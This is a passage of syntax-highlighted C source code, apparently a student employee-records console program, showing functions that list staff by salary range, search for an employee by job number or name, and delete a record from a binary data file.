string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">3000</span><span class="token operator">&amp;&amp;</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">8000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3_1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token comment">//以员工号方式查询某个员工的信息。</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的职工号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token comment">//以员工号方式查询某个员工的信息。</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的职工号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3_2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//以姓名方式查找员工；</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的姓名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token comment">//用found数组进行比较如果found数组和name相同则执行；</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>        <span class="token comment">//当</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">f_4</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//删除数据；</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> find<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要删除的职工号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>find<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;=</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            NUM<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token comment">//将num--这个操作，更改变量的大小，方便再次存入。</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>NUM<span class="token operator">&lt;</span>j<span class="token punctuation">)</span>        <span class="token comment">//如果没有提前结束，j的最终大小回是num+1;判断num是否及时结束。</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"该职工号不存在！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token punctuation">;</span> j<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//将read[j]进行移位，达到删除的目的；</span>    <span class="token function">fclose</span><span class="token 